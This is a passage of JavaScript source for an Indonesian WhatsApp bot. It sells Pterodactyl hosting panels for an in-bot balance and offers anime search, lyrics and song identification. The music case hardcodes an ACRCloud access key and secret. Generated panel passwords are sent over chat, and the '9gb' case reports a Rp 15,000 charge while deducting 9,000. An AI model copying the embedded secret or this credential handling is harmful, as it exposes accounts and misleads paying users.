"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 4,000`)
minSaldo(sender, 4000, db_saldo)
break
case "5gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 5000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 5,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 5gb"
let egg = global.eggsnya
let loc = global.location
let memo = "5200"
let cpu = "110"
let disk = "5200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 5,000`)
minSaldo(sender, 5000, db_saldo)
break
case "6gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 6000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 6,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 6gb"
let egg = global.eggsnya
let loc = global.location
let memo = "6200"
let cpu = "140"
let disk = "6200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 6,000`)
minSaldo(sender, 6000, db_saldo)
break
case "7gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 7000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 7,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 7gb"
let egg = global.eggsnya
let loc = global.location
let memo = "7200"
let cpu = "160"
let disk = "7200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 7,000`)
minSaldo(sender, 7000, db_saldo)
break
case "8gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 8000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 8,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 8gb"
let egg = global.eggsnya
let loc = global.location
let memo = "8200"
let cpu = "180"
let disk = "8200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 8,000`)
minSaldo(sender, 8000, db_saldo)
break
case "9gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 9000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 9,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 9gb"
let egg = global.eggsnya
let loc = global.location
let memo = "9200"
let cpu = "190"
let disk = "9200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 15,000`)
minSaldo(sender, 9000, db_saldo)
break
case '0gb': case "unlimited": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 15000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 15,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 0gb"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 15,000`)
minSaldo(sender, 15000, db_saldo)
break
























































// FITUR SEARCH
case 'otakudesu':
let { otakudesu } = require('@xct007/frieren-scraper')
async function originalUrl(url) {
    return (await axios(url)).request.res.responseUrl
}
if (!text && !(/otakulatest|otakudesulatest|otakudesu-latest/i.test(command))) return m.reply(`Masukan Query Atau Link!\n\nContoh :\n${prefix + command} Tonikaku Kawai\n${prefix + command} https://otakudesu.lol/anime/tonikaku-ni-kawaii-sub-indo/`)
if (/otakulatest|otakudesulatest|otakudesu-latest/i.test(command)) {
var result = await otakudesu.latest()
var teks = result.map((v, i) => {
return `
${i + 1}. ${v.title}
Hari : ${v.day}
Tanggal : ${v.date}
Link : ${v.url}
`.trim()
}).filter(v => v).join('\n\n')

alice.sendMessage(from, {text: teks, contextInfo:{ mentionedJid: alice.ments(`${teks}`), forwardingScore: 0, isForwarded: true, businessMessageForwardInfo: { businessOwnerJid: botNumber },
externalAdReply : {title: `${result.judul}`,body: `${salam}`,mediaType: 1,previewType: "PHOTO",thumbnailUrl: 'https://telegra.ph/file/f6e852652377ef6aa9710.jpg',renderLargerThumbnail: true,sourceUrl: `${result[0].url}`}}})
} else if (text.startsWith('https://otakudesu.cloud/anime')) {
let result = await otakudesu.detail(text)
let caption = result.url.episodes.reverse().map((v, i) => {
return `
${i + 1}. ${v.title}
Link : ${v.url}
`.trim()
}).join('\n\n')
let teks = `
Title : ${result.judul}
Score : ${result.skor}
Produser : ${result.produser}
Status : ${result.status}
Total Eps : ${result.total_episode}
Durasi : ${result.durasi}
Tanggal Rilis : ${result.tanggal_rilis}
Studio : ${result.studio}
Genre : ${result.genre}
`.trim()
alice.sendMessage(from, {text: caption, contextInfo:{ mentionedJid: alice.ments(`${teks}`), forwardingScore: 0, isForwarded: true, businessMessageForwardInfo: { businessOwnerJid: botNumber },
externalAdReply : {title: `${result.judul}`,body: `${salam}`,mediaType: 1,previewType: "PHOTO",thumbnailUrl: 'https://telegra.ph/file/f6e852652377ef6aa9710.jpg',renderLargerThumbnail: true,sourceUrl: `${result[0].url}`}}})

} else if (text.startsWith('https://otakudesu.cloud/episode')) {
var result = await otakudesu.detail(text)
let d1 = await originalUrl(result.urls['360p'] ? result.urls['360p'][4].url: result.urls['Mp4 360p'][4].url)
let d2 = await originalUrl(result.urls['480p'] ? result.urls['480p'][4].url: result.urls['Mp4 480p'][4].url)
let d3 = await originalUrl(result.urls['720p'] ? result.urls['720p'][4].url: result.urls['Mp4 720p'][4].url)
var caption = `
Download Resolusi 360p
Link : ${d1}

Download Resolusi 480p
Link : ${d2}

Download Resolusi 720p
Link : ${d3}


Cara Mendownload Anime
${prefix} mega ${d1}
`.trim()
        reply(caption)
                } else {
let resul = await otakudesu.search(text)
let tekkk = resul.map((v, i) => {
return `
${i + 1}. ${v.title}
Status : ${v.status}
Genre : ${v.genres}
Link : ${v.url}`.trim()
        }).filter(v => v).join('\n\n')
alice.sendMessage(from, {text: tekkk, contextInfo:{ mentionedJid: alice.ments(`${teks}`), forwardingScore: 0, isForwarded: true, businessMessageForwardInfo: { businessOwnerJid: botNumber },
externalAdReply : {title: `${result.judul}`,body: `${salam}`,mediaType: 1,previewType: "PHOTO",thumbnailUrl: 'https://telegra.ph/file/f6e852652377ef6aa9710.jpg',renderLargerThumbnail: true,sourceUrl: `${result[0].url}`}}})

}
break
case 'animesearch': {
if (!text) return replygcxeon(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await loading()
const anime = await malScraper.getInfoFromName(text).catch(() => null)
if (!anime) return replygcxeon(`Could not find`)
let animetxt = `
• *Title: ${anime.title}*
• *Type: ${anime.type}*
• *Premiered :* ${anime.premiered}
• *Total Episodes :* ${anime.episodes}
• *Status :* ${anime.status}
• *Genres :* ${anime.genres}
• *Studio :* ${anime.studios}
• *Score :* ${anime.score}
• *Rating :* ${anime.rating}
• *Rank :* ${anime.ranked}
• *Popularity :* ${anime.popularity}
• *Trailer :* ${anime.trailer}
• *Url :* ${anime.url}
• *Description :* ${anime.synopsis}`
await alice.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted: fpayment2})
}
break
case 'lirik':
let fg = require('api-dylux')
if (!text) throw `masukan title dari lagu yang ingin anda cari liriknya`
try {
 let res = await fg.lyrics(text);
 let mes = `▢ *${res.title}*
▢ *${res.artist}*

▢ ${res.lyrics}`;
    alice.sendFile(m.chat, res.NSthumb, 'img.png', mes, m);
} catch (e) {
} 
break
case 'musicapa': case 'whatmusic':
case 'judulsong':
let acrcloud = require('acrcloud')
let acr = new acrcloud({
host: 'identify-eu-west-1.acrcloud.com',
access_key: 'c33c767d683f78bd17d4bd4991955d81',
access_secret: 'bvgaIAEtADBTbLwiPGYlxupWqkNGIjT7J9Ag2vIu'
})
if (/audio|video/.test(mime)) {
let media = await quoted.download()
var ext = mime.split('/')[1]
fs.writeFileSync(`./.npm/${m.sender}.${ext}`, media)
var ressas = await acr.identify(fs.readFileSync(`./.npm/${m.sender}.${ext}`))
var { code, msg } = ressas.status
if (code !== 0) throw msg
var { title, artists, album, genres, release_date } = ressas.metadata.music[0]
var txt = `*${title}*
• 🎙️ Artist : ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}
• 🎞️ Album : ${album.name || 'NOT FOUND'}
• ⌨️ Gener : ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}
• 🗒️ Release : ${release_date || 'NOT FOUND'}
`.trim()
fs.unlinkSync(`./.npm/${m.sender}.${ext}`)
reply795(txt)
} else throw '*𝚁𝙴𝚂𝙿𝙾𝙽𝙳 𝙰𝚄𝙳𝙸𝙾*'
break
case "nontontv":
{

let teksk = `PILIH POLLING BERIKUT

dibawah adalah list dari channel top di televisi
pilih polling dari channel yang ingin di tonton
setelah itu bot akan memberi channel yang ingin
anda tonton dengan berupa link`
